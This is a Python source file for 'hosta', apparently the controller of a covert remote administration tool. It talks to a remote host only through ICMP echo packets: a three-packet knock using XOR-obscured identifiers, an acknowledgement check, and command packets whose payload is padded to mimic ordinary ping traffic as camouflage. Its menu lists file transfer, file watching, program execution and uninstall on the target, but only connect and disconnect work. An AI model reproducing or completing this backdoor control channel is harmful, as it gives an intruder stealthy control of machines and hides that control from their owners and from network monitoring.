#!/usr/bin/env python3
"""hosta: control center for the remote administration tool.

ICMP-only wire protocol:
  * Knocks: 3 ICMP echo requests, identifier=encrypted(knock magic),
    sequence=1..3.
  * Ack: 1 ICMP echo reply from hostb, identifier=encrypted(ACK_MAGIC).
  * Commands: ICMP echo requests, identifier=encrypted(command code),
    sequence is the packet order.

Usage:
    sudo python3 hosta.py <hostb_ip>
"""

import socket
import struct
import sys
import time

# Magic identifier values that make up the knock sequence (these used to
# be the knock port numbers in the TCP-knock version).
KNOCK_IDS = (7000, 8000, 9000)
KNOCK_DELAY_SECONDS = 0.1
ACK_TIMEOUT_SECONDS = 5.0

# Identifier hostb stamps on the ack so we can pick it out of the noise
# of the kernel's auto-replies to our own echo requests.
ACK_MAGIC = 0xACAC

PRE_SHARED_KEY = 0xA5C3
CMD_DISCONNECT = 1

TTL = 64
ICMP_ECHO_REPLY = 0
ICMP_ECHO_REQUEST = 8

# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
# 0x10..0x3F filler pattern. Receiver ignores this; it's just camouflage.
PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))

MENU_OPTIONS = (
    "Connect to hostb",
    "Disconnect from hostb",
    "Uninstall from hostb",
    "Transfer file to hostb",
    "Transfer file from hostb",
    "Watch file on hostb",
    "Watch directory on hostb",
    "Run program on hostb",
)


def detect_source_ip(destination_ip: str) -> str:
    probe_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe_socket.connect((destination_ip, 1))
        return probe_socket.getsockname()[0]
    finally:
        probe_socket.close()


def compute_checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    running_total = 0
    for byte_pair_start in range(0, len(data), 2):
        word = (data[byte_pair_start] << 8) + data[byte_pair_start + 1]
        running_total += word
        running_total = (running_total & 0xFFFF) + (running_total >> 16)
    return ~running_total & 0xFFFF


def build_ip_header(source_ip: str, destination_ip: str, total_length: int) -> bytes:
    def header_with_checksum(checksum_value: int) -> bytes:
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            socket.IPPROTO_ICMP,
            checksum_value,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    correct_checksum = compute_checksum(header_with_checksum(0))
    return header_with_checksum(correct_checksum)


def encrypt_identifier(plaintext: int) -> int:
    return (plaintext ^ PRE_SHARED_KEY) & 0xFFFF


def build_icmp_echo_request(identifier_encrypted: int, sequence: int) -> bytes:
    def packet_with_checksum(checksum_value: int) -> bytes:
        header = struct.pack(
            "!BBHHH",
            ICMP_ECHO_REQUEST,
            0,                         # code
            checksum_value,
            identifier_encrypted,
            sequence,
        )
        return header + PING_PAYLOAD
    correct_checksum = compute_checksum(packet_with_checksum(0))
    return packet_with_checksum(correct_checksum)


def send_icmp_packet(destination_ip: str, source_ip: str, icmp_packet: bytes) -> None:
    raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    try:
        ip_header = build_ip_header(source_ip, destination_ip, 20 + len(icmp_packet))
        raw_socket.sendto(ip_header + icmp_packet, (destination_ip, 0))
    finally:
        raw_socket.close()


def send_port_knock_sequence(destination_ip: str, source_ip: str) -> None:
    for knock_index, knock_id in enumerate(KNOCK_IDS):
        if knock_index > 0:
            time.sleep(KNOCK_DELAY_SECONDS)
        identifier = encrypt_identifier(knock_id)
        sequence = knock_index + 1
        icmp_packet = build_icmp_echo_request(identifier, sequence)
        send_icmp_packet(destination_ip, source_ip, icmp_packet)
        print(
            f"  ICMP -> {destination_ip} "
            f"id={identifier:#06x} (knock={knock_id}) seq={sequence}"
        )


def wait_for_connection_ack(
    recv_socket: socket.socket, hostb_ip: str, timeout_seconds: float
) -> bool:
    deadline = time.time() + timeout_seconds
    expected_id = encrypt_identifier(ACK_MAGIC)
    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return False
        recv_socket.settimeout(remaining)
        try:
            packet, _ = recv_socket.recvfrom(65535)
        except socket.timeout:
            return False

        if len(packet) < 28:
            continue
        ip_header_length = (packet[0] & 0x0F) * 4
        if len(packet) < ip_header_length + 8:
            continue
        if socket.inet_ntoa(packet[12:16]) != hostb_ip:
            continue

        icmp_header = packet[ip_header_length:ip_header_length + 8]
        icmp_type, _code, _chk, identifier, _seq = struct.unpack("!BBHHH", icmp_header)
        if icmp_type != ICMP_ECHO_REPLY:
            continue
        if identifier != expected_id:
            # Skip the kernel's auto-replies to our own echo requests —
            # they carry whatever identifier we sent, not ACK_MAGIC.
            continue
        return True


def connect_to_hostb(destination_ip: str) -> bool:
    print("\n=== Connect ===")
    source_ip = detect_source_ip(destination_ip)
    # Open recv socket first so we don't miss a fast ack.
    recv_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    try:
        print(f"knocking {destination_ip} from {source_ip}")
        send_port_knock_sequence(destination_ip, source_ip)
        print("sent 3 knock packets, waiting for ack...")
        if wait_for_connection_ack(recv_socket, destination_ip, ACK_TIMEOUT_SECONDS):
            print("connection established")
            return True
        print("connection failed: no ack from hostb")
        return False
    finally:
        recv_socket.close()


def send_command(destination_ip: str, command_code: int, sequence: int = 1) -> None:
    source_ip = detect_source_ip(destination_ip)
    identifier = encrypt_identifier(command_code)
    icmp_packet = build_icmp_echo_request(identifier, sequence)
    send_icmp_packet(destination_ip, source_ip, icmp_packet)
    print(
        f"  ICMP -> {destination_ip} "
        f"id={identifier:#06x} (cmd={command_code}) seq={sequence}"
    )


def print_menu(connected: bool) -> None:
    state_label = "connected" if connected else "disconnected"
    print(f"\n--- hosta menu --- ({state_label})")
    for index, label in enumerate(MENU_OPTIONS, start=1):
        print(f"  {index}) {label}")


def main() -> int:
    if len(sys.argv) != 2:
        print("Usage: sudo python3 hosta.py <hostb_ip>", file=sys.stderr)
        return 2
    destination_ip = sys.argv[1]
    connected = False

    while True:
        print_menu(connected)
        try:
            choice = input("choice> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            return 0

        if choice == "1":
            if connected:
                print("already connected")
                continue
            try:
                connected = connect_to_hostb(destination_ip)
            except PermissionError:
                print("permission denied (raw sockets require sudo)")
        elif choice == "2":
            if not connected:
                print("not connected; use option 1 first")
                continue
            print("\n=== Disconnect ===")
            try:
                send_command(destination_ip, CMD_DISCONNECT)
                connected = False
                print("disconnect command sent")
            except PermissionError:
                print("permission denied (raw sockets require sudo)")
        elif choice in {"3", "4", "5", "6", "7", "8"}:
            print("not implemented yet")
        else:
            print("invalid choice")


if __name__ == "__main__":
    raise SystemExit(main())
